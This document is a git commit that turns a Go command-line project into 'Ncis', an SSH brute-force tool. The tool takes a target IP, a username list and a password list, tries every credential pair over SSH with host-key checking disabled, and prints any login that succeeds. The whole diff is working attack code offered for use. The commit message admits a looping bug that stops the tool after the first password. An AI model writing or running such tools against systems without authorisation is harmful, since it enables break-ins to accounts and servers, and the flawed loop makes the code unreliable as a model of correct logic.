b29074715e5b6007e0c5c5c7e68cbb0c91894715
Ishan Goel <igoel.mail@gmail.com>
2021-02-02 21:22:04 +0400

    Add in the actual code (for some reason it only uses the first password in the file?)

---
+++ go.mod
@@ -0,0 +1,9 @@
+module ncis
+
+go 1.15
+
+require (
+	github.com/fatih/color v1.10.0
+	golang.org/x/crypto v0.0.0-20201221181555-eec23a3978ad
+	golang.org/x/sys v0.0.0-20210124154548-22da62e12c0c // indirect
+)
--- ncis.go
+++ ncis.go
@@ -1,20 +1,33 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"github.com/fatih/color"
+	"golang.org/x/crypto/ssh"
 	"os"
+	"strings"
 )
 
 var (
 	version = "dev"
-	helpMsg = `lolsh - A shell with all output lolcat-ed
-Usage: lolsh [-v/--version | -v/--help]`
+	helpMsg = `Ncis - Brute force ssh super fast
+
+Usage: ncis <target IP> <user list> <password list>
+       ncis [-v/--version | -h/--help]
+   <target IP>     : the address to ssh into
+   <user list>     : path to file with usernames on each line
+   <password list> : path to file with passwords on each line`
 )
 
 func main() {
+	// TODO: get wordlists from env vars so user does not have to type/remember paths
 	if len(os.Args) > 4 {
 		handleErrStr("too many arguments (>3)") // will accept ip addr, pass list and user list
+		fmt.Println(helpMsg)
+		return
+	}
+	if len(os.Args) == 1 {
 		fmt.Println(helpMsg)
 		return
 	}
@@ -23,7 +36,55 @@ func main() {
 		return
 	}
 	if hasOption, _ := argsHaveOption("version", "v"); hasOption {
-		fmt.Println("ncis " + version)
+		fmt.Println("Ncis " + version)
+		return
+	}
+	userFile, err := os.Open(os.Args[2])
+	if err != nil {
+		handleErr(err)
+		return
+	}
+	passFile, err := os.Open(os.Args[3])
+	if err != nil {
+		handleErr(err)
+		return
+	}
+	bruteForceSSH(os.Args[1], userFile, passFile)
+}
+
+func bruteForceSSH(target string, userFile *os.File, passFile *os.File) {
+	if !strings.Contains(target, ":") {
+		target += ":22"
+	}
+	userFileScanner := bufio.NewScanner(userFile)
+	passFileScanner := bufio.NewScanner(passFile)
+
+	for passFileScanner.Scan() {
+		password := passFileScanner.Text()
+		for userFileScanner.Scan() {
+			user := userFileScanner.Text()
+			config := &ssh.ClientConfig{
+				User: user,
+				Auth: []ssh.AuthMethod{
+					ssh.Password(password),
+				},
+				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+			}
+			_, err := ssh.Dial("tcp", target, config)
+			if err == nil {
+				fmt.Println(color.HiGreenString("Found credentials: ") + user + ":" + password)
+				return
+			} else {
+				fmt.Println(color.YellowString("Failed attempt: ") + user + ":" + password)
+			}
+		}
+		if err := userFileScanner.Err(); err != nil {
+			handleErr(err)
+			continue
+		}
+	}
+	if err := passFileScanner.Err(); err != nil {
+		handleErr(err)
 		return
 	}
 }
